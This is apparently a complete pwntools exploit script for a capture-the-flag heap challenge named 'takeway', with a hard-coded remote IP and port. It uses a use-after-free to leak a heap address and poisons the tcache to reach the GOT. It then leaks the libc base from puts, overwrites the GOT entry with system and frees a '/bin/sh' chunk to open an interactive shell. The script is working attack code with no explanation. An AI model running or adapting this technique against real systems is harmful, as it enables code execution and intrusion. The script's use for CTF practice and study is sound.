from pwn import *
import sys
remote_addr = ["101.200.234.115",43744]
libc = ELF('./libc-2.31.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./takeway_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def add(idx, name, remark):
    sla(b'choose:', b'1')
    sla(b'index', str(idx).encode())
    sa(b'name:', name)
    sa(b'remark:', remark)

def delete(idx):
    sla(b'choose:', b'2')
    sla(b'index:', str(idx).encode())

def modify(idx, name):
    sla(b'choose:', b'3')
    sla(b'index:', str(idx).encode())
    ru(b'is: ')
    t = rud(b'\n')
    sa(b':', name)
    return t

debug('''
    set debug-file-directory /home/kali/Desktop/pwn-problems/bluehat2023_takeway/debug
    b *0x401331
    b *0x40147b
    b *0x40154b
''')

add(0, b'a' * 8, b'b' * 0x14)
add(1, b'a' * 8, b'b' * 0x14)
delete(0)
heap_addr = u64(modify(0, p64(0)).ljust(8, b'\x00'))
pr('heap_addr', heap_addr)

delete(1)
modify(1, p64(heap_addr + 0x290))
add(2, b'/bin/sh\x00', b'b' * 0x14)
add(3, p64(0x404018), p64(0))
libc_base = u64(modify(0, p64(0)).ljust(8, b'\x00')) - libc.sym['puts']
libc.address = libc_base
pr('libc_base', libc_base)

modify(0, p64(libc.sym['system']))
delete(2)


shell()
